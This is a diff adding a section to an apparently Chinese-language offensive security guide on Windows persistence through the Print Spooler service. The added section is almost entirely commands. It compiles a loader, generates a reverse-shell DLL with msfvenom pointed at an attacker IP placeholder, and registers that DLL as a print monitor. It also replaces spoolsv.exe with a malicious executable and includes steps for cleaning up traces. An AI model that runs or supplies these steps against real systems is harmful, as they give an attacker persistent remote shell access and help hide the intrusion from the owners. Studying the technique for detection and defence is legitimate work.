@@ -1011,3 +1011,30 @@ Get-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name 'SCRNSAVE.EXE'
 Remove-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name 'ScreenSaveTimeOut'
 Remove-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name 'SCRNSAVE.EXE'
 ```
+
+### Windows打印后台处理程序服务
+
+[monitor.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/Per/monitor.cpp)
+
+```Bash
+x86_64-w64-mingw32-g++ -O2 monitor.cpp -o monitor.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive -lwinspool
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=攻击者IP地址 LPORT=4444 -f dll > print.dll
+```
+
+```Bash
+reg add "HKLM\System\CurrentControlSet\Control\Print\Monitors\Wolf" /v "Driver" /d "print.dll" /t REG_SZ
+Remove-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Print\Monitors\Wolf" -Name "Driver"
+```
+
+```powershell
+Stop-Service -Name Spooler -Force  //停止打印后台处理程序服务
+Copy-Item -Path "C:\Windows\System32\spoolsv.exe" -Destination "C:\Windows\System32\spoolsv.exe.bak"  //备份原始的spoolsv.exe文件
+Copy-Item -Path "恶意可执行程序" -Destination "C:\Windows\System32\spoolsv.exe" -Force  //替换spoolsv.exe为恶意程序
+Start-Service -Name Spooler  //启动打印后台处理程序服务
+
+清理痕迹
+Stop-Service -Name Spooler -Force
+Copy-Item -Path "C:\Windows\System32\spoolsv.exe.bak" -Destination "C:\Windows\System32\spoolsv.exe" -Force
+Start-Service -Name Spooler
+```
